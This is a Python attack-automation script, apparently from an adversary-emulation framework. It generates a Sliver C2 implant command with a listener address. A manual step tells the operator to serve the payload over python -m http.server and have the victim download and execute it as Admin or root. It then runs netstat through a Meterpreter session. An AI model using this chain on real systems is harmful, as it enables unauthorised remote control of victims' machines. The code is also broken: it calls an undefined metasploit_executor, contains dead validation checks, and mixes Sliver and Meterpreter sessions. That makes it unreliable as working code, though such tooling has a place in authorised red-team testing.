
import asyncio
import questionary
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="aurora/executor/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)

    async def executor_sliver_implant_generation():
        console.print(
            "[bold deep_sky_blue4]Generating the command to create a Sliver payload...[/bold deep_sky_blue4]"
        )

        # collect user input
        protocol = await questionary.select(
            "Select protocol", choices=["mtls", "http", "https"]
        ).ask_async()
        lhost = await questionary.text(
            "Enter listening address",
            default="192.168.146.129",
        ).ask_async()
        lport = await questionary.text(
            "Enter listening port",
            default="9001",
            validate=lambda x: x.isdigit() and 1 <= int(x) <= 65535 if x else False,
        ).ask_async()
        os_type = await questionary.select(
            "Select target OS",
            choices=["windows", "linux", "macos"],
        ).ask_async()
        arch = await questionary.select(
            "Select architecture",
            choices=["64bit", "32bit"],
        ).ask_async()
        save_path = await questionary.text(
            "Save path", default="/home/user/Downloads"
        ).ask_async()
        command = f"sliver generate --{protocol} {lhost}:{lport} --os {os_type} --arch {arch} --save {save_path}"
        console.print(
            f"[bold violet]Step: Commands to Generate Sliver Implant[/]", justify="left"
        )
        console.print(
            "─" * min(50, len("Commands to Generate Sliver Implant") + 10),
            style="dim violet",
        )
        console.print(f"[bold deep_sky_blue4]Commands to execute:[/]", justify="left")
        console.print(f"  [dim cyan]└─>[/] [pale_green3]{command}[/]")

        confirmed = confirm_action()
        if not confirmed:
            console.print(
                "Step canceled. Please ensure you have completed the manual steps."
            )
            return
    await executor_sliver_implant_generation()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
        """)
    confirm_action()


    # Meterpreter Session Selection
    console.print("[bold cyan]\n[Meterpreter Executor] Session Selection[/]")
    metasploit_sessionid = metasploit_executor.select_meterpreter_session()

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: tcp[/]")
    console.print(f"  Description: Show TCP connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for tcp [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: tcp")
    user_params["tcp"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: udp[/]")
    console.print(f"  Description: Show UDP connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for udp [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: udp")
    user_params["udp"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ipv4[/]")
    console.print(f"  Description: Show IPv4 connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for ipv4 [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: ipv4")
    user_params["ipv4"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ipv6[/]")
    console.print(f"  Description: Show IPv6 connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for ipv6 [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: ipv6")
    user_params["ipv6"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: listening[/]")
    console.print(f"  Description: Show listening ports (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for listening [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: listening")
    user_params["listening"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 4 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: SessionID[/]")
    console.print(f"  Description: The session ID of the active Sliver connection.")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for SessionID [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: SessionID")
    user_params["SessionID"] = user_input

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: netstat[/]")
    confirm_action()
    try:
        metasploit_executor.netstat(user_params["tcp"], user_params["udp"], user_params["ipv4"], user_params["ipv6"], user_params["listening"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

if __name__ == "__main__":
    asyncio.run(main())
